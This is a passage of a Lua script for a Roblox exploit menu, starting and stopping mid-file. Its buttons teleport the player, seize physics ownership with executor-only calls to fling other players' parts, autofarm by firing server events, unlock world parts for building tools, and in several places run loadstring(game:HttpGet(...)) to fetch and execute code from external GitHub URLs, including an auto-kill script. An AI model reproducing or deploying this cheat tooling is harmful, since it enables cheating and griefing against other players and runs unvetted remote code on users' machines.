a.megavip.TextColor3 = Color3.fromRGB(204, 204, 204)
a.megavip.TextScaled = true
a.megavip.TextSize = 14.000
a.megavip.TextWrapped = true
a.megavip.MouseButton1Down:connect(
    function()
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =
            CFrame.new(
            0.943781853,
            264,
            68.8041763,
            -0.95515871,
            -4.34895284e-08,
            0.296094328,
            -4.27114628e-08,
            1,
            9.09610431e-09,
            -0.296094328,
            -3.9583985e-09,
            -0.95515871
        )
    end
)
a.UICorner_65.CornerRadius = UDim.new(0, 4)
a.UICorner_65.Parent = a.megavip
a.middleisland.Name = "middleisland"
a.middleisland.Parent = a.Frame_8
a.middleisland.AnchorPoint = Vector2.new(0.5, 0)
a.middleisland.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.middleisland.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.middleisland.BorderSizePixel = 2
a.middleisland.Position = UDim2.new(0.5, 0, 0.757539868, 0)
a.middleisland.Size = UDim2.new(1, 0, -0.00340277422, 30)
a.middleisland.ZIndex = 2
a.middleisland.Font = Enum.Font.SourceSansBold
a.middleisland.Text = "Middle Island"
a.middleisland.TextColor3 = Color3.fromRGB(204, 204, 204)
a.middleisland.TextScaled = true
a.middleisland.TextSize = 14.000
a.middleisland.TextWrapped = true
a.middleisland.MouseButton1Down:connect(
    function()
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =
            CFrame.new(
            9.45706654,
            168.999924,
            0.300861239,
            -0.00628334982,
            0,
            -0.999980271,
            0,
            1,
            0,
            0.999980271,
            0,
            -0.00628334982
        )
    end
)
a.UICorner_66.CornerRadius = UDim.new(0, 4)
a.UICorner_66.Parent = a.middleisland
a.shop.Name = "shop"
a.shop.Parent = a.Frame_8
a.shop.AnchorPoint = Vector2.new(0.5, 0)
a.shop.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.shop.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.shop.BorderSizePixel = 2
a.shop.Position = UDim2.new(0.5, 0, 0.816789269, 0)
a.shop.Size = UDim2.new(1, 0, -0.00340277422, 30)
a.shop.ZIndex = 2
a.shop.Font = Enum.Font.SourceSansBold
a.shop.Text = "Shop"
a.shop.TextColor3 = Color3.fromRGB(204, 204, 204)
a.shop.TextScaled = true
a.shop.TextSize = 14.000
a.shop.TextWrapped = true
a.shop.MouseButton1Down:connect(
    function()
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =
            CFrame.new(
            61.2894249,
            264,
            -1.10551608,
            0.0125657292,
            0,
            -0.999921083,
            0,
            1,
            0,
            0.999921083,
            0,
            0.0125657292
        )
    end
)
a.UICorner_67.CornerRadius = UDim.new(0, 4)
a.UICorner_67.Parent = a.shop
a.spwan.Name = "spwan"
a.spwan.Parent = a.Frame_8
a.spwan.AnchorPoint = Vector2.new(0.5, 0)
a.spwan.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.spwan.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.spwan.BorderSizePixel = 2
a.spwan.Position = UDim2.new(0.5, 0, 0.87603879, 0)
a.spwan.Size = UDim2.new(1, 0, -0.00340277422, 30)
a.spwan.ZIndex = 2
a.spwan.Font = Enum.Font.SourceSansBold
a.spwan.Text = "Spawn"
a.spwan.TextColor3 = Color3.fromRGB(204, 204, 204)
a.spwan.TextScaled = true
a.spwan.TextSize = 14.000
a.spwan.TextWrapped = true
a.spwan.MouseButton1Down:connect(
    function()
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =
            CFrame.new(0.0309376884, 268, -0.224571913, -4.703179e-07, 0, 1, 0, 1, 0, -1, 0, -4.703179e-07)
    end
)
a.UICorner_68.CornerRadius = UDim.new(0, 4)
a.UICorner_68.Parent = a.spwan
a.vip.Name = "vip"
a.vip.Parent = a.Frame_8
a.vip.AnchorPoint = Vector2.new(0.5, 0)
a.vip.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.vip.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.vip.BorderSizePixel = 2
a.vip.Position = UDim2.new(0.5, 0, 0.93528831, 0)
a.vip.Size = UDim2.new(1, 0, -0.00340277422, 30)
a.vip.ZIndex = 2
a.vip.Font = Enum.Font.SourceSansBold
a.vip.Text = "Vip"
a.vip.TextColor3 = Color3.fromRGB(204, 204, 204)
a.vip.TextScaled = true
a.vip.TextSize = 14.000
a.vip.TextWrapped = true
a.vip.MouseButton1Down:connect(
    function()
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =
            CFrame.new(
            0.247168869,
            264,
            -69.3129272,
            0.999921381,
            1.06557989e-08,
            0.0125656724,
            -1.05549374e-08,
            1,
            -8.09296541e-09,
            -0.0125656724,
            7.95969779e-09,
            0.999921381
        )
    end
)
a.UICorner_69.CornerRadius = UDim.new(0, 4)
a.UICorner_69.Parent = a.vip
a.GameStore.Name = "GameStore"
a.GameStore.Parent = a.Frame_8
a.GameStore.AnchorPoint = Vector2.new(0.5, 0)
a.GameStore.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.GameStore.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.GameStore.BorderSizePixel = 2
a.GameStore.Position = UDim2.new(0.5, 0, 0.994537771, 0)
a.GameStore.Size = UDim2.new(1, 0, -0.00340277422, 30)
a.GameStore.ZIndex = 2
a.GameStore.Font = Enum.Font.SourceSansBold
a.GameStore.Text = "Game Store"
a.GameStore.TextColor3 = Color3.fromRGB(204, 204, 204)
a.GameStore.TextScaled = true
a.GameStore.TextSize = 14.000
a.GameStore.TextWrapped = true
a.GameStore.MouseButton1Down:connect(
    function()
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =
            CFrame.new(
            -59.9186897,
            264,
            0.00818219129,
            0.0125666363,
            2.58190047e-09,
            0.999921024,
            -6.16111384e-10,
            1,
            -2.57436117e-09,
            -0.999921024,
            -5.8371169e-10,
            0.0125666363
        )
    end
)
a.UICorner_70.CornerRadius = UDim.new(0, 4)
a.UICorner_70.Parent = a.GameStore
a.UICorner_71.CornerRadius = UDim.new(0, 4)
a.UICorner_71.Parent = a.PagesFrame
a.FeScriptsFrame.Name = "FeScriptsFrame"
a.FeScriptsFrame.Parent = a.PagesFrame
a.FeScriptsFrame.Active = true
a.FeScriptsFrame.BackgroundTransparency = 1.000
a.FeScriptsFrame.BorderSizePixel = 0
a.FeScriptsFrame.Position = UDim2.new(0, 6, 0, 9)
a.FeScriptsFrame.Size = UDim2.new(1.33246756, -142, 1.09487176, -56)
a.FeScriptsFrame.Visible = false
a.FeScriptsFrame.CanvasSize = UDim2.new(0, 0, 0, 604)
a.FeScriptsFrame.ScrollBarThickness = 3
a.UIListLayout_21.Parent = a.FeScriptsFrame
a.UIListLayout_21.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_21.Padding = UDim.new(0, 10)
a.efscrku.Name = "efscrku"
a.efscrku.Parent = a.FeScriptsFrame
a.efscrku.Active = true
a.efscrku.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.efscrku.Size = UDim2.new(1, -10, 0, 36)
a.UICorner_72.CornerRadius = UDim.new(0, 3)
a.UICorner_72.Parent = a.efscrku
a.skriper.Name = "skriper"
a.skriper.Parent = a.efscrku
a.skriper.Active = true
a.skriper.BackgroundTransparency = 1.000
a.skriper.Position = UDim2.new(0, 8, 0, 8)
a.skriper.Size = UDim2.new(1, -16, 1, -16)
a.UIListLayout_22.Parent = a.skriper
a.UIListLayout_22.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_22.Padding = UDim.new(0, 4)
a.Title_7.Name = "Title"
a.Title_7.Parent = a.skriper
a.Title_7.Active = true
a.Title_7.BackgroundTransparency = 1.000
a.Title_7.Size = UDim2.new(1, 0, 0, 20)
a.Title_7.Font = Enum.Font.GothamSemibold
a.Title_7.Text = "Fe Scripts"
a.Title_7.TextColor3 = Color3.fromRGB(255, 255, 255)
a.Title_7.TextSize = 14.000
a.Title_7.TextXAlignment = Enum.TextXAlignment.Left
a.efscri.Name = "efscri"
a.efscri.Parent = a.FeScriptsFrame
a.efscri.Active = true
a.efscri.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.efscri.Position = UDim2.new(0, 0, 0.123989217, 0)
a.efscri.Size = UDim2.new(1, -10, 0.407008082, 36)
a.UICorner_73.CornerRadius = UDim.new(0, 3)
a.UICorner_73.Parent = a.efscri
a.scriped.Name = "scriped"
a.scriped.Parent = a.efscri
a.scriped.Active = true
a.scriped.BackgroundTransparency = 1.000
a.scriped.Position = UDim2.new(0, 8, 0, 8)
a.scriped.Size = UDim2.new(1, -16, 1, -16)
a.UIListLayout_23.Parent = a.scriped
a.UIListLayout_23.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_23.Padding = UDim.new(0, 4)
a.Title_8.Name = "Title"
a.Title_8.Parent = a.scriped
a.Title_8.Active = true
a.Title_8.BackgroundTransparency = 1.000
a.Title_8.Size = UDim2.new(1, 0, 0, 20)
a.Title_8.Font = Enum.Font.GothamSemibold
a.Title_8.Text = "Fe Scripts!"
a.Title_8.TextColor3 = Color3.fromRGB(255, 255, 255)
a.Title_8.TextSize = 14.000
a.Title_8.TextXAlignment = Enum.TextXAlignment.Left
a.blackhole.Name = "blackhole"
a.blackhole.Parent = a.scriped
a.blackhole.AnchorPoint = Vector2.new(0.5, 0)
a.blackhole.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.blackhole.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.blackhole.BorderSizePixel = 2
a.blackhole.Position = UDim2.new(0.5, 0, 0.0250000004, 0)
a.blackhole.Size = UDim2.new(1, 0, 0, 30)
a.blackhole.ZIndex = 2
a.blackhole.Font = Enum.Font.SourceSansBold
a.blackhole.Text = "Black Hole"
a.blackhole.TextColor3 = Color3.fromRGB(204, 204, 204)
a.blackhole.TextScaled = true
a.blackhole.TextSize = 14.000
a.blackhole.TextWrapped = true
a.blackhole.MouseButton1Down:connect(
    function()
        local b = game:GetService("UserInputService")
        local d = game:GetService("Players").LocalPlayer:GetMouse()
        local e = Instance.new("Folder", game:GetService("Workspace"))
        local f = Instance.new("Part", e)
        local g = Instance.new("Attachment", f)
        f.Anchored = true
        f.CanCollide = false
        f.Transparency = 1
        local h = d.Hit + Vector3.new(0, 5, 0)
        local i =
            coroutine.create(
            function()
                settings().Physics.AllowSleep = false
                while game:GetService("RunService").RenderStepped:Wait() do
                    for j, k in next, game:GetService("Players"):GetPlayers() do
                        if k ~= game:GetService("Players").LocalPlayer then
                            k.MaximumSimulationRadius = 0
                            sethiddenproperty(k, "SimulationRadius", 0)
                        end
                    end
                    game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge, math.huge)
                    setsimulationradius(math.huge)
                end
            end
        )
        coroutine.resume(i)
        local function l(v)
            if
                v:IsA("Part") and v.Anchored == false and v.Parent:FindFirstChild("Humanoid") == nil and
                    v.Parent:FindFirstChild("Head") == nil and
                    v.Name ~= "Handle"
             then
                d.TargetFilter = v
                for j, m in next, v:GetChildren() do
                    if
                        m:IsA("BodyAngularVelocity") or m:IsA("BodyForce") or m:IsA("BodyGyro") or m:IsA("BodyPosition") or
                            m:IsA("BodyThrust") or
                            m:IsA("BodyVelocity") or
                            m:IsA("RocketPropulsion")
                     then
                        m:Destroy()
                    end
                end
                if v:FindFirstChild("Attachment") then
                    v:FindFirstChild("Attachment"):Destroy()
                end
                if v:FindFirstChild("AlignPosition") then
                    v:FindFirstChild("AlignPosition"):Destroy()
                end
                if v:FindFirstChild("Torque") then
                    v:FindFirstChild("Torque"):Destroy()
                end
                v.CanCollide = false
                local n = Instance.new("Torque", v)
                n.Torque = Vector3.new(100000, 100000, 100000)
                local o = Instance.new("AlignPosition", v)
                local p = Instance.new("Attachment", v)
                n.Attachment0 = p
                o.MaxForce = 9999999999999999
                o.MaxVelocity = math.huge
                o.Responsiveness = 200
                o.Attachment0 = p
                o.Attachment1 = g
            end
        end
        for j, v in next, game:GetService("Workspace"):GetDescendants() do
            l(v)
        end
        game:GetService("Workspace").DescendantAdded:Connect(
            function(v)
                l(v)
            end
        )
        b.InputBegan:Connect(
            function(q, r)
                if q.KeyCode == Enum.KeyCode.E and not r then
                    h = d.Hit + Vector3.new(0, 5, 0)
                end
            end
        )
        spawn(
            function()
                while game:GetService("RunService").RenderStepped:Wait() do
                    g.WorldCFrame = h
                end
            end
        )
    end
)
a.UICorner_74.CornerRadius = UDim.new(0, 4)
a.UICorner_74.Parent = a.blackhole
a.feadamcagirma.Name = "feadamcagirma"
a.feadamcagirma.Parent = a.scriped
a.feadamcagirma.AnchorPoint = Vector2.new(0.5, 0)
a.feadamcagirma.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.feadamcagirma.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.feadamcagirma.BorderSizePixel = 2
a.feadamcagirma.Position = UDim2.new(0.5, 0, 0.0250000004, 0)
a.feadamcagirma.Size = UDim2.new(1, 0, 0, 30)
a.feadamcagirma.ZIndex = 2
a.feadamcagirma.Font = Enum.Font.SourceSansBold
a.feadamcagirma.Text = "Fe Fling Man"
a.feadamcagirma.TextColor3 = Color3.fromRGB(204, 204, 204)
a.feadamcagirma.TextScaled = true
a.feadamcagirma.TextSize = 14.000
a.feadamcagirma.TextWrapped = true
a.feadamcagirma.MouseButton1Down:connect(
    function()
        loadstring(
            game:HttpGet("https://raw.githubusercontent.com/qHXwvs48h3aan6/MyScripts/main/Adam%C3%87a%C4%9F%C4%B1rma")
        )()
    end
)
a.UICorner_75.CornerRadius = UDim.new(0, 4)
a.UICorner_75.Parent = a.feadamcagirma
a.feamogus.Name = "feamogus"
a.feamogus.Parent = a.scriped
a.feamogus.AnchorPoint = Vector2.new(0.5, 0)
a.feamogus.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.feamogus.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.feamogus.BorderSizePixel = 2
a.feamogus.Position = UDim2.new(0.5, 0, 0.0250000004, 0)
a.feamogus.Size = UDim2.new(1, 0, 0, 30)
a.feamogus.ZIndex = 2
a.feamogus.Font = Enum.Font.SourceSansBold
a.feamogus.Text = "Fe Amogus"
a.feamogus.TextColor3 = Color3.fromRGB(204, 204, 204)
a.feamogus.TextScaled = true
a.feamogus.TextSize = 14.000
a.feamogus.TextWrapped = true
a.feamogus.MouseButton1Down:connect(
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/qHXwvs48h3aan6/MyScripts/main/Amogus"))()
    end
)
a.UICorner_76.CornerRadius = UDim.new(0, 4)
a.UICorner_76.Parent = a.feamogus
a.fehatsuniverse.Name = "fehatsuniverse"
a.fehatsuniverse.Parent = a.scriped
a.fehatsuniverse.AnchorPoint = Vector2.new(0.5, 0)
a.fehatsuniverse.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.fehatsuniverse.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.fehatsuniverse.BorderSizePixel = 2
a.fehatsuniverse.Position = UDim2.new(0.5, 0, 0.0250000004, 0)
a.fehatsuniverse.Size = UDim2.new(1, 0, 0, 30)
a.fehatsuniverse.ZIndex = 2
a.fehatsuniverse.Font = Enum.Font.SourceSansBold
a.fehatsuniverse.Text = "Fe Slasher"
a.fehatsuniverse.TextColor3 = Color3.fromRGB(204, 204, 204)
a.fehatsuniverse.TextScaled = true
a.fehatsuniverse.TextSize = 14.000
a.fehatsuniverse.TextWrapped = true
a.fehatsuniverse.MouseButton1Down:connect(
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/qHXwvs48h3aan6/MyScripts/main/feslasher"))()
    end
)
a.UICorner_77.CornerRadius = UDim.new(0, 4)
a.UICorner_77.Parent = a.fehatsuniverse
a.fekeyboard.Name = "fekeyboard"
a.fekeyboard.Parent = a.scriped
a.fekeyboard.AnchorPoint = Vector2.new(0.5, 0)
a.fekeyboard.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.fekeyboard.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.fekeyboard.BorderSizePixel = 2
a.fekeyboard.Position = UDim2.new(0.5, 0, 0.0250000004, 0)
a.fekeyboard.Size = UDim2.new(1, 0, 0, 30)
a.fekeyboard.ZIndex = 2
a.fekeyboard.Font = Enum.Font.SourceSansBold
a.fekeyboard.Text = "Fe Keyboard(GUI)"
a.fekeyboard.TextColor3 = Color3.fromRGB(204, 204, 204)
a.fekeyboard.TextScaled = true
a.fekeyboard.TextSize = 14.000
a.fekeyboard.TextWrapped = true
a.fekeyboard.MouseButton1Down:connect(
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/qHXwvs48h3aan6/MyScripts/main/keyboard"))()
    end
)
a.UICorner_78.CornerRadius = UDim.new(0, 4)
a.UICorner_78.Parent = a.fekeyboard
a.feneptunain.Name = "feneptunain"
a.feneptunain.Parent = a.scriped
a.feneptunain.AnchorPoint = Vector2.new(0.5, 0)
a.feneptunain.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.feneptunain.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.feneptunain.BorderSizePixel = 2
a.feneptunain.Position = UDim2.new(0.5, 0, 0.0250000004, 0)
a.feneptunain.Size = UDim2.new(1, 0, 0, 30)
a.feneptunain.ZIndex = 2
a.feneptunain.Font = Enum.Font.SourceSansBold
a.feneptunain.Text = "Fe Neptunain V Sword"
a.feneptunain.TextColor3 = Color3.fromRGB(204, 204, 204)
a.feneptunain.TextScaled = true
a.feneptunain.TextSize = 14.000
a.feneptunain.TextWrapped = true
a.feneptunain.MouseButton1Down:connect(
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/qHXwvs48h3aan6/MyScripts/main/FeNeptunainSword"))()
    end
)
a.UICorner_79.CornerRadius = UDim.new(0, 4)
a.UICorner_79.Parent = a.feneptunain
a.ferussosword.Name = "ferussosword"
a.ferussosword.Parent = a.scriped
a.ferussosword.AnchorPoint = Vector2.new(0.5, 0)
a.ferussosword.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.ferussosword.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.ferussosword.BorderSizePixel = 2
a.ferussosword.Position = UDim2.new(0.5, 0, 0.0250000004, 0)
a.ferussosword.Size = UDim2.new(1, 0, 0, 30)
a.ferussosword.ZIndex = 2
a.ferussosword.Font = Enum.Font.SourceSansBold
a.ferussosword.Text = "Fe Russo Sword"
a.ferussosword.TextColor3 = Color3.fromRGB(204, 204, 204)
a.ferussosword.TextScaled = true
a.ferussosword.TextSize = 14.000
a.ferussosword.TextWrapped = true
a.ferussosword.MouseButton1Down:connect(
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/qHXwvs48h3aan6/MyScripts/main/FeRussoSword"))()
    end
)
a.UICorner_80.CornerRadius = UDim.new(0, 4)
a.UICorner_80.Parent = a.ferussosword
a.ScriptsFrame.Name = "ScriptsFrame"
a.ScriptsFrame.Parent = a.PagesFrame
a.ScriptsFrame.Active = true
a.ScriptsFrame.BackgroundTransparency = 1.000
a.ScriptsFrame.BorderSizePixel = 0
a.ScriptsFrame.Position = UDim2.new(0, 6, 0, 9)
a.ScriptsFrame.Size = UDim2.new(1.33246756, -142, 1.09487176, -56)
a.ScriptsFrame.Visible = false
a.ScriptsFrame.CanvasSize = UDim2.new(0, 0, 0, 604)
a.ScriptsFrame.ScrollBarThickness = 3
a.UIListLayout_24.Parent = a.ScriptsFrame
a.UIListLayout_24.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_24.Padding = UDim.new(0, 10)
a.scripttext.Name = "scripttext"
a.scripttext.Parent = a.ScriptsFrame
a.scripttext.Active = true
a.scripttext.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.scripttext.Size = UDim2.new(1, -10, 0, 36)
a.UICorner_81.CornerRadius = UDim.new(0, 3)
a.UICorner_81.Parent = a.scripttext
a.skriper_2.Name = "skriper"
a.skriper_2.Parent = a.scripttext
a.skriper_2.Active = true
a.skriper_2.BackgroundTransparency = 1.000
a.skriper_2.Position = UDim2.new(0, 8, 0, 8)
a.skriper_2.Size = UDim2.new(1, -16, 1, -16)
a.UIListLayout_25.Parent = a.skriper_2
a.UIListLayout_25.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_25.Padding = UDim.new(0, 4)
a.Title_9.Name = "Title"
a.Title_9.Parent = a.skriper_2
a.Title_9.Active = true
a.Title_9.BackgroundTransparency = 1.000
a.Title_9.Size = UDim2.new(1, 0, 0, 20)
a.Title_9.Font = Enum.Font.GothamSemibold
a.Title_9.Text = "Scripts"
a.Title_9.TextColor3 = Color3.fromRGB(255, 255, 255)
a.Title_9.TextSize = 14.000
a.Title_9.TextXAlignment = Enum.TextXAlignment.Left
a.scripts.Name = "scripts"
a.scripts.Parent = a.ScriptsFrame
a.scripts.Active = true
a.scripts.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.scripts.Position = UDim2.new(0, 0, -0.504043102, 0)
a.scripts.Size = UDim2.new(1, -10, 0.867924511, 36)
a.UICorner_82.CornerRadius = UDim.new(0, 3)
a.UICorner_82.Parent = a.scripts
a.scriped_2.Name = "scriped"
a.scriped_2.Parent = a.scripts
a.scriped_2.Active = true
a.scriped_2.BackgroundTransparency = 1.000
a.scriped_2.Position = UDim2.new(0, 8, 0, 8)
a.scriped_2.Size = UDim2.new(1, -16, 1.115, -16)
a.UIListLayout_26.Parent = a.scriped_2
a.UIListLayout_26.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_26.Padding = UDim.new(0, 4)
a.Title_10.Name = "Title"
a.Title_10.Parent = a.scriped_2
a.Title_10.Active = true
a.Title_10.BackgroundTransparency = 1.000
a.Title_10.Size = UDim2.new(1, 0, 0, 20)
a.Title_10.Font = Enum.Font.GothamSemibold
a.Title_10.Text = "Scripts!"
a.Title_10.TextColor3 = Color3.fromRGB(255, 255, 255)
a.Title_10.TextSize = 14.000
a.Title_10.TextXAlignment = Enum.TextXAlignment.Left
a.autofarm.Name = "autofarm"
a.autofarm.Parent = a.scriped_2
a.autofarm.AnchorPoint = Vector2.new(0.5, 0)
a.autofarm.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.autofarm.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.autofarm.BorderSizePixel = 2
a.autofarm.Position = UDim2.new(0.5, 0, 0.0440992974, 0)
a.autofarm.Size = UDim2.new(1, 0, -0.00717593404, 30)
a.autofarm.ZIndex = 2
a.autofarm.Font = Enum.Font.SourceSansBold
a.autofarm.Text = "Autofarm Mines"
a.autofarm.TextColor3 = Color3.fromRGB(204, 204, 204)
a.autofarm.TextScaled = true
a.autofarm.TextSize = 14.000
a.autofarm.TextWrapped = true
a.autofarm.MouseButton1Down:connect(
    function()
        if game.Players.LocalPlayer.Backpack:FindFirstChild("Axe") then
            game.Players.LocalPlayer.Backpack:FindFirstChild("Axe").Parent = game.Players.LocalPlayer.Character
        end
        if game.Players.LocalPlayer.Character:FindFirstChild("Axe") then
            game.Players.LocalPlayer.Character:FindFirstChild("Axe"):Activate()
        end
        wait()
        local s = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        local t = workspace:getDescendants()
        for u = 1, #t do
            if t[u].Name == "Block" and t[u].Parent.Name == "Ores" then
                repeat
                    wait()
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = t[u].CFrame
                    game.Players.LocalPlayer.Character.Axe.RemoteEvent:FireServer(t[u])
                until t[u].Name ~= "Block" or not game.Players.LocalPlayer.Character:findFirstChild("Axe")
            end
        end
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = s
    end
)
a.UICorner_83.CornerRadius = UDim.new(0, 4)
a.UICorner_83.Parent = a.autofarm
a.autofarmsblocks.Name = "autofarmsblocks"
a.autofarmsblocks.Parent = a.scriped_2
a.autofarmsblocks.AnchorPoint = Vector2.new(0.5, 0)
a.autofarmsblocks.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.autofarmsblocks.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.autofarmsblocks.BorderSizePixel = 2
a.autofarmsblocks.Position = UDim2.new(0.5, 0, 0.100205839, 0)
a.autofarmsblocks.Size = UDim2.new(1, 0, -0.00717593404, 30)
a.autofarmsblocks.ZIndex = 2
a.autofarmsblocks.Font = Enum.Font.SourceSansBold
a.autofarmsblocks.Text = "Autofarm Blocks"
a.autofarmsblocks.TextColor3 = Color3.fromRGB(204, 204, 204)
a.autofarmsblocks.TextScaled = true
a.autofarmsblocks.TextSize = 14.000
a.autofarmsblocks.TextWrapped = true
a.autofarmsblocks.MouseButton1Down:connect(
    function()
        if game.Players.LocalPlayer.Backpack:FindFirstChild("Axe") then
            game.Players.LocalPlayer.Backpack:FindFirstChild("Axe").Parent = game.Players.LocalPlayer.Character
        end
        if game.Players.LocalPlayer.Character:FindFirstChild("Axe") then
            game.Players.LocalPlayer.Character:FindFirstChild("Axe"):Activate()
        end
        wait()
        local s = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        local t = workspace:getDescendants()
        for u = 1, #t do
            if t[u].Name == "Block" and t[u].Parent.Name == "Blocks" then
                repeat
                    wait()
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = t[u].CFrame
                    game.Players.LocalPlayer.Character.Axe.RemoteEvent:FireServer(t[u])
                until game.Players.LocalPlayer.Backpack.Block.Left.Value ~= 64 or
                    not game.Players.LocalPlayer.Character:findFirstChild("Axe")
            end
        end
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = s
    end
)
a.UICorner_84.CornerRadius = UDim.new(0, 4)
a.UICorner_84.Parent = a.autofarmsblocks
a.autokillall.Name = "autokillall"
a.autokillall.Parent = a.scriped_2
a.autokillall.AnchorPoint = Vector2.new(0.5, 0)
a.autokillall.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.autokillall.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.autokillall.BorderSizePixel = 2
a.autokillall.Position = UDim2.new(0.5, 0, 0.156312376, 0)
a.autokillall.Size = UDim2.new(1, 0, -0.00717593404, 30)
a.autokillall.ZIndex = 2
a.autokillall.Font = Enum.Font.SourceSansBold
a.autokillall.Text = "AutoKill(All Rounds)"
a.autokillall.TextColor3 = Color3.fromRGB(204, 204, 204)
a.autokillall.TextScaled = true
a.autokillall.TextSize = 14.000
a.autokillall.TextWrapped = true
a.autokillall.MouseButton1Down:connect(
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cfeciefe/scs/main/kil"))()
    end
)
a.UICorner_85.CornerRadius = UDim.new(0, 4)
a.UICorner_85.Parent = a.autokillall
a.btools.Name = "btools"
a.btools.Parent = a.scriped_2
a.btools.AnchorPoint = Vector2.new(0.5, 0)
a.btools.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.btools.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.btools.BorderSizePixel = 2
a.btools.Position = UDim2.new(0.5, 0, 0.212418914, 0)
a.btools.Size = UDim2.new(1, 0, -0.00717593404, 30)
a.btools.ZIndex = 2
a.btools.Font = Enum.Font.SourceSansBold
a.btools.Text = "Btools"
a.btools.TextColor3 = Color3.fromRGB(204, 204, 204)
a.btools.TextScaled = true
a.btools.TextSize = 14.000
a.btools.TextWrapped = true
a.btools.MouseButton1Down:connect(
    function()
        local w = game:GetService("StarterGui")
        w:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
        for x, y in pairs(workspace:GetChildren()) do
            if y.ClassName == "Part" then
                y.Locked = false
            end
            if y.ClassName == "MeshPart" then
                y.Locked = false
            end
            if y.ClassName == "UnionOperation" then
                y.Locked = false
            end
            if y.ClassName == "Model" then
                for x, z in pairs(y:GetChildren()) do
                    if z.ClassName == "Part" then
                        z.Locked = false
                    end
                    if z.ClassName == "MeshPart" then
                        z.Locked = false
                    end
                    if z.ClassName == "UnionOperation" then
                        z.Locked = false
                    end
                    if z.ClassName == "Model" then
                        for x, A in pairs(z:GetChildren()) do
                            if A.ClassName == "Part" then
                                A.Locked = false
                            end
                            if A.ClassName == "MeshPart" then
                                A.Locked = false
                            end
                            if A.ClassName == "UnionOperation" then
                                A.Locked = false
                            end
                            if A.ClassName == "Model" then
                                for x, B in pairs(A:GetChildren()) do
                                    if B.ClassName == "Part" then
                                        B.Locked = false
                                    end
                                    if B.ClassName == "MeshPart" then
                                        B.Locked = false
                                    end
                                    if B.ClassName == "UnionOperation" then
                                        B.Locked = false
                                    end
                                    if B.ClassName == "Model" then
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        c = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
        c.BinType = Enum.BinType.Hammer
        c = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
        c.BinType = Enum.BinType.Clone
        c = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
        c.BinType = Enum.BinType.Grab
    end
)
a.UICorner_86.CornerRadius = UDim.new(0, 4)
a.UICorner_86.Parent = a.btools
a.cmdxadmin.Name = "cmdxadmin"
a.cmdxadmin.Parent = a.scriped_2
a.cmdxadmin.AnchorPoint = Vector2.new(0.5, 0)
a.cmdxadmin.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.cmdxadmin.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.cmdxadmin.BorderSizePixel = 2
a.cmdxadmin.Position = UDim2.new(0.5, 0, 0.268525451, 0)
a.cmdxadmin.Size = UDim2.new(1, 0, -0.00717593404, 30)
a.cmdxadmin.ZIndex = 2
a.cmdxadmin.Font = Enum.Font.SourceSansBold
